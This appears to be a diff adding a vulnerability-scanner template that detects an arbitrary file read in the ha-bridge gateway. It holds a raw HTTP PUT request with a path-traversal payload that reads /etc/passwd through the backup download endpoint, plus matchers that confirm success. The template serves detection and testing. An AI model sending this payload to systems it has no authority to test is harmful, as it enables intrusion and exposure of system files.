@@ -1,0 +1,31 @@
+id: ha-bridge-gateway-download-anyfile-read
+info:
+  name: ha-bridge Gateway Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Detects ha-bridge gateway arbitrary file read vulnerability via `/api/devices/backup/download` endpoint.
+http:
+  - raw:
+      - |
+        PUT /api/devices/backup/download HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"filename":"../../../../etc/passwd"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
